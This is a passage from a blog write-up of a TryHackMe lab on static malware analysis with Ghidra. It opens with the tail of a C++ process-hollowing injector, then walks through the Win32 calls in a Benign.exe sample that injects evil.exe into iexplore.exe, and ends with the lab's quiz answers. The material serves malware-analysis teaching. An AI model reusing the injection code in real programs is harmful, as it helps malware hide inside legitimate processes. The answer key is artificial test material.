                    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hProcess</span><span class="p">);</span>
                    <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
                <span class="p">}</span>

                <span class="c1">// Write the headers of the source image to the target process</span>
                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">lpBaseAddress</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">pe</span><span class="p">.</span><span class="n">modBaseAddr</span><span class="p">,</span> <span class="n">inth</span><span class="p">.</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">SizeOfHeaders</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwRead</span><span class="p">))</span>
                <span class="p">{</span>
                    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hProcess</span><span class="p">);</span>
                    <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
                <span class="p">}</span>

                <span class="c1">// Write each section of the source image to the target process</span>
                <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">inth</span><span class="p">.</span><span class="n">FileHeader</span><span class="p">.</span><span class="n">NumberOfSections</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
                <span class="p">{</span>
                    <span class="n">ReadProcessMemory</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)(</span><span class="n">pe</span><span class="p">.</span><span class="n">modBaseAddr</span> <span class="o">+</span> <span class="n">idh</span><span class="p">.</span><span class="n">e_lfanew</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">IMAGE_NT_HEADERS</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">i</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">IMAGE_SECTION_HEADER</span><span class="p">))),</span> <span class="o">&amp;</span><span class="n">ish</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ish</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">dwRead</span><span class="p">);</span>
                    <span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">DWORD</span><span class="p">)</span><span class="n">lpBaseAddress</span> <span class="o">+</span> <span class="n">ish</span><span class="p">.</span><span class="n">VirtualAddress</span><span class="p">),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">DWORD</span><span class="p">)</span><span class="n">pe</span><span class="p">.</span><span class="n">modBaseAddr</span> <span class="o">+</span> <span class="n">ish</span><span class="p">.</span><span class="n">PointerToRawData</span><span class="p">),</span> <span class="n">ish</span><span class="p">.</span><span class="n">SizeOfRawData</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwRead</span><span class="p">);</span>
                <span class="p">}</span>

                <span class="c1">// Calculate the new entry point for the source image</span>
                <span class="n">DWORD</span> <span class="n">dwEntrypoint</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">pe</span><span class="p">.</span><span class="n">modBaseAddr</span> <span class="o">+</span> <span class="n">inth</span><span class="p">.</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">AddressOfEntryPoint</span><span class="p">;</span>
                <span class="n">DWORD</span> <span class="n">dwOffset</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">lpBaseAddress</span> <span class="o">-</span> <span class="n">inth</span><span class="p">.</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">ImageBase</span> <span class="o">+</span> <span class="n">dwEntrypoint</span><span class="p">;</span>

                <span class="c1">// Write the new entry point to the target process</span>
                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)(</span><span class="n">lpBaseAddress</span> <span class="o">+</span> <span class="n">dwEntrypoint</span> <span class="o">-</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">pe</span><span class="p">.</span><span class="n">modBaseAddr</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">dwOffset</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">DWORD</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">dwRead</span><span class="p">))</span>
                <span class="p">{</span>
                    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hProcess</span><span class="p">);</span>
                    <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
                <span class="p">}</span>

                <span class="c1">// Close the handle to the target process</span>
                <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hProcess</span><span class="p">);</span>

                <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">Process32Next</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe</span><span class="p">));</span>
    <span class="p">}</span>

    <span class="c1">// Close the handle to the snapshot</span>
    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">);</span>

    <span class="c1">// Initialize the STARTUPINFO and PROCESS_INFORMATION structures</span>
    <span class="n">STARTUPINFO</span> <span class="n">si</span><span class="p">;</span>
    <span class="n">PROCESS_INFORMATION</span> <span class="n">pi</span><span class="p">;</span>
    <span class="n">ZeroMemory</span><span class="p">(</span><span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">si</span><span class="p">));</span>
    <span class="n">ZeroMemory</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pi</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">pi</span><span class="p">));</span>

    <span class="c1">// Create the source process in a suspended state</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CreateProcess</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">szSourceProcessName</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">CREATE_SUSPENDED</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi</span><span class="p">))</span>
    <span class="p">{</span>
        <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// Get the context of the source process's primary thread</span>
    <span class="n">CONTEXT</span> <span class="n">ctx</span><span class="p">;</span>
    <span class="n">ctx</span><span class="p">.</span><span class="n">ContextFlags</span> <span class="o">=</span> <span class="n">CONTEXT_FULL</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">GetThreadContext</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ctx</span><span class="p">))</span>
    <span class="p">{</span>
        <span class="n">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">);</span>
        <span class="n">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">);</span>
        <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// Update the entry point in the context to point to the new image</span>
    <span class="n">ctx</span><span class="p">.</span><span class="n">Eax</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">pi</span><span class="p">.</span><span class="n">lpBaseOfImage</span> <span class="o">+</span> <span class="p">((</span><span class="n">IMAGE_DOS_HEADER</span><span class="o">*</span><span class="p">)</span><span class="n">pi</span><span class="p">.</span><span class="n">lpBaseOfImage</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">e_lfanew</span> <span class="o">+</span> <span class="p">((</span><span class="n">IMAGE_NT_HEADERS</span><span class="o">*</span><span class="p">)(((</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span><span class="n">pi</span><span class="p">.</span><span class="n">lpBaseOfImage</span><span class="p">)</span> <span class="o">+</span> <span class="p">((</span><span class="n">IMAGE_DOS_HEADER</span><span class="o">*</span><span class="p">)</span><span class="n">pi</span><span class="p">.</span><span class="n">lpBaseOfImage</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">e_lfanew</span><span class="p">))</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">AddressOfEntryPoint</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">SetThreadContext</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ctx</span><span class="p">))</span>
    <span class="p">{</span>
        <span class="n">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">);</span>
        <span class="n">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">);</span>
        <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// Resume the source process's primary thread</span>
    <span class="n">ResumeThread</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">);</span>

    <span class="c1">// Close handles to the source process and thread</span>
    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">);</span>
    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">);</span>

    <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="c1">// Define the source and target process names</span>
    <span class="kt">char</span><span class="o">*</span> <span class="n">szSourceProcessName</span> <span class="o">=</span> <span class="s">"C:</span><span class="se">\\\\</span><span class="s">Windows</span><span class="se">\\\\</span><span class="s">System32</span><span class="se">\\\\</span><span class="s">calc.exe"</span><span class="p">;</span>
    <span class="kt">char</span><span class="o">*</span> <span class="n">szTargetProcessName</span> <span class="o">=</span> <span class="s">"notepad.exe"</span><span class="p">;</span>

    <span class="c1">// Attempt to hollow the target process and print the result</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">HollowProcess</span><span class="p">(</span><span class="n">szSourceProcessName</span><span class="p">,</span> <span class="n">szTargetProcessName</span><span class="p">))</span>
    <span class="p">{</span>
        <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"Process hollowing successful"</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">else</span>
    <span class="p">{</span>
        <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"Process hollowing failed"</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

</code></pre></div></div> <h3 id="questions-4">Questions</h3> <p><strong>Which API is used to to write malicious code to the allocated memory during process hollowing?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">WriteProcessMemory()</code></em></p> <h2 id="task-9---analyzing-process-hollowing">Task 9 - Analyzing Process Hollowing</h2> <p>Now that we understand the basics of Ghidra, some techniques in a disassembled version and some usages with the Windows API, we are going to analyze a sample called <code class="language-plaintext highlighter-rouge">Benign.exe</code>.</p> <p>Our goals are:</p> <ul> <li>Examine API calls to find a suspiccious pattern</li> <li>Look at suspicious strings</li> <li>Find interesting functions</li> <li>Examine disassembled/decompiled code to find as much information as possible</li> </ul> <blockquote> <p><strong>Note:</strong> Even if we are starting by looking for Windows API calls right away, it is not how an analyst would start analyzing an unknown binary.</p> </blockquote> <h3 id="createprocess">CreateProcess</h3> <p>In the previous task, we have learnt in process hollowing that a legitimate victim process is created in the suspended state. We can search for <code class="language-plaintext highlighter-rouge">CreateProcessA</code> function in <em>Imports -&gt; Kernel32.dll</em> and <em>Show References to</em>:</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/H16dnN6OA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="CreateProcessA search" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <p>The first reference will take us to the <em>Process Hollowing</em> function, at the legitimate process creation:</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/SyxHpVTuR.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="References to CreateProcessA" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PROCESS_INFORMATION</span> <span class="n">pi</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CreateProcess</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">szSourceProcessName</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">CREATE_SUSPENDED</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi</span><span class="p">))</span>
    <span class="p">{</span>
        <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
    <span class="p">}</span>
</code></pre></div></div> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/HJd_6NaOA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="CreateProcessA decompiled" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <p>It clearly shows how the parameters on the stack are pushed in reverse order before calling the function? The <code class="language-plaintext highlighter-rouge">0x4</code> value represent the suspended state in the <a href="https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags" rel="external nofollow noopener" target="_blank">process creation flag</a>.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/H1W5A46_C.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="CREATE_SUSPENDED" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <h3 id="graph-view">Graph View</h3> <p>The <strong>Display Function Graph</strong> in the toolbar will show the graph view of the disassembled code we are examining.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/BywIJSauA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="CreateProcessA Graph View" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <p>In this case, the program:</p> <ul> <li>Fails to create a victim process in the suspended state, it will follow the red arrow, thus the block 1.</li> <li>Successfully creates the victim rocess, it will follow the block 2, the green arrow.</li> </ul> <h3 id="open-suspicious-file">Open Suspicious File</h3> <p>The <a href="https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea" rel="external nofollow noopener" target="_blank">CreateFileA</a> funciton is either used to create or open an existing file. The behaviour is chosen by using <code class="language-plaintext highlighter-rouge">GENERIC_READ</code> or <code class="language-plaintext highlighter-rouge">GENERIC_WRITE</code> for the <code class="language-plaintext highlighter-rouge">dwDesiredAccess</code> parameter.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/Ski-QBauR.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="CreateFileA disassembled" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <p>Then, new memory is created in the victim process using <a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc" rel="external nofollow noopener" target="_blank">VirtualAlloc</a> with the size of the file (<a href="https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-getfilesize" rel="external nofollow noopener" target="_blank">GetFileSize</a>).</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/rk44Br6OA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Memory Allocation" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <p>Moreover, the <em>hFile</em> handle of <em>CreateFileA</em> will be used to get the content using the <a href="https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-readfile" rel="external nofollow noopener" target="_blank">ReadFile</a> function. Then, the file’s content will be written in the already allocated memory. The location of the new memory is the <em>lpBuffer</em> var.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/BkiBISpuA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="ReadFile compiled" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <h3 id="hollowing-the-process">Hollowing the process</h3> <p>Malware use <code class="language-plaintext highlighter-rouge">ZwUnmapViewOfSection</code> or <code class="language-plaintext highlighter-rouge">NtUnmapViewOfSection</code> API calls to unmap the target process’s memory.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/Byz2LS6O0.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="NtUnmapViewOfSection call" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <p><a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwunmapviewofsection" rel="external nofollow noopener" target="_blank">NtUnmapViewOfSection</a> takes exactly two arguments, the <strong>base address</strong> (virtual address) to be unmapped and the <strong>handle to the process</strong> that needs to be hollowed. Essentially, it removes a previously mapped section of memory, making that memory range available for other uses. In the context of process hollowing, malware uses <code class="language-plaintext highlighter-rouge">NtUnmapViewOfSection</code> to remove the existing memory contents of a target process. This creates a clean slate, allowing the attacker to inject and execute their own code within the address space of a legitimate process, thereby gaining control of it while minimizing detection risks.</p> <h3 id="allocate-memory">Allocate Memory</h3> <p>Once the process is hollowed, malware must allocate needed memory using <a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex" rel="external nofollow noopener" target="_blank">VirtualAllocEx</a> before writing the rogue part.<br> Arguments passed to the function include a handle to the process, address to be allocated, size, allocation type, and memory protection flag.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/SJskrdAu0.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="VirtualAllocEx disassembled" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <h3 id="write-down-the-memory">Write down the memory</h3> <p>Once the memory is allocated, the malware will attempt to write the suspicious process into the memory of the hollowed process using <a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory" rel="external nofollow noopener" target="_blank">WriteProcessMemory</a>.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/rJ-9r_0dR.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="WriteProcessMemory disassembled" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <p>There were three calls to the <code class="language-plaintext highlighter-rouge">WriteProcessMemory</code> Function. The last call references to the code in the Kernel32 DLL; therefore, we can ignore that. From the decompiled code, it seems the program is copying different sections of the suspicious process one by one.</p> <h3 id="resume-thread">Resume Thread</h3> <p>Once all is sorted out, the malware will get hold of the thread using the <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext" rel="external nofollow noopener" target="_blank">SetThreadContext</a> and then resume the thread using <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread" rel="external nofollow noopener" target="_blank">ResumeThread</a>.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/BkUgu_AO0.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Thread Resuming disassembled" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <h3 id="questions-5">Questions</h3> <p><strong>What is the MD5 hash of the benign.exe sample?</strong></p> <p>Go to the project browser, then <em>right click on the executable -&gt; properties</em></p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/HyrJ5OCOR.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="benign.exe properties" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">e60a461b80467a4b1187ae2081f8ca24</code></em></p> <p><strong>How many API calls are returned if we search for the term ‘Create’ in the Symbol Tree section?</strong></p> <p>For this question, we need to use the filter of the Symbol Tree.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/SygDqdAuC.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Symbol Tree filter" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">2</code></em></p> <p><strong>What is the first virtual address where the CreateProcessA function is called?</strong></p> <p>We need to use the <em>Show References to</em> or <em>Ctrl+Shift+F</em> to search for occurences of the function in the program.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/r1TAq_RdR.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Show References to" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/Bk3Ni_ROA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="First Occurence" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">0040108f</code></em></p> <p><strong>Which process is being created in suspended state by using the <code class="language-plaintext highlighter-rouge">CreateProcessA</code> API call?</strong></p> <p>The created process’s name is located at the second parameter of the <code class="language-plaintext highlighter-rouge">CreateProcessA</code> function.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/S1xBh_0uC.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="CreateProessA syntax" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/B1nPhu0dR.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="CreateProcessA decompiled parameters" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">iexplore.exe</code></em></p> <p><strong>What is the first virtual address where the <code class="language-plaintext highlighter-rouge">CreateFileA</code> function is called?</strong></p> <p>The same thing to locate <em>CreateProcessA</em> is done here.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/SkqeaORuC.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="CreateFileA" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">004010f0</code></em></p> <p><strong>What is the suspicious process being injected into the victim process?</strong></p> <p>The process name can be found in the first parameter of <em>CreateFileA</em>.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/Sy4_6dAd0.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="CreateFileA syntax" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/BkdcTdCd0.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="CreateFileA decompiled parameters" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">evil.exe</code></em></p> <p><strong>Based on the Function Graph, what is the virtual address of the code block that will be executed if the program doesn’t find the suspicious process?</strong></p> <p>The executed code if the program doesn’t find the suspicious process would be this:</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/r1NBCdR_0.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Decompiled block" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <p>According to the <em>Function Graph</em>, this is the code clock we get:</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/rkFSJKCOR.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="CreateFileA error code block" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">00401101</code></em></p> <p><strong>Which API call is found in the import functions used to unmap the process’s memory?</strong></p> <p>The API call can be found in <em>ntdll.dll</em>:</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/rkixlFA_A.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="NtUnmapViewOfSection" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">NtUnmapViewOfSection</code></em></p> <p><strong>How many calls to the <code class="language-plaintext highlighter-rouge">WriteProcessMemory</code> function are found in the code? (.text section)</strong></p> <p>There are two occurences/API calls shown in the <em>Location References Provider</em>.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/r1HOeYROC.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="WriteProcessMemory location" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">2</code></em></p> <p><strong>What is the full path of the suspicious process shown in the strings?</strong></p> <p>To answer this, we have to go back to our <code class="language-plaintext highlighter-rouge">CreateFileA</code> function call.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/Hk81WF0OA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="CreateFileA suspicious file call string" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">"C:\\Users\\THM-Attacker\\Desktop\\Injectors\\evil.exe"</code></em></p> <h2 id="task-10---conclusion">Task 10 - Conclusion</h2> <p>In summary, this room provided foundational knowledge in advanced static analysis of malware using Ghidra, a powerful and free tool for dissecting executable files. We explored common APIs employed by malware, such as CreateProcessA, CreateFileA, and WriteProcessMemory, and gained insights into the process hollowing technique, where a malicious code injects itself into a legitimate process. By mastering these elements, we enhance our ability to analyze and understand malware behaviors, ultimately improving our skills in cybersecurity and threat detection.</p> <p>The next step after performing advanced static analysis is the dynamic analysis, which will be covered next.</p> </div> </article> <br> <hr> <br> <ul class="list-disc pl-8"></ul> <h2 class="text-3xl font-semibold mb-4 mt-12">Enjoy Reading This Article?</h2> <p class="mb-2">Here are some more articles you might like to read next:</p> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2024/THM-MalDoc-Static-Analysis/">THM MalDoc: Static Analysis</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2024/THM-Anti-Reverse-Engineering/">THM Anti-Reverse Engineering</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2024/THM-Basic-Dynamic-Analysis/">THM Basic Dynamic Analysis</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2024/THM-Dynamic-Analysis-Debugging/">THM Dynamic Analysis: Debugging</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2024/THM-x86-Architecture-Overview/">THM x86 Architecture Overview</a> </li> </div> </div> </div> </div> <footer class="fixed-bottom" role="contentinfo"> <div class="container mt-0"> © Copyright 2024 NonoHM . Powered by <a href="https://jekyllrb.com/" target="_blank" rel="external nofollow noopener">Jekyll</a> with <a href="https://github.com/alshedivat/al-folio" rel="external nofollow noopener" target="_blank">al-folio</a> theme. Hosted by <a href="https://pages.github.com/" target="_blank" rel="external nofollow noopener">GitHub Pages</a>. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@5.0.0/imagesloaded.pkgd.min.js" integrity="sha256-htrLFfZJ6v5udOG+3kNLINIKh2gvoKqwEhHYfTTMICc=" crossorigin="anonymous"></script> <script defer src="/assets/js/masonry.js" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" 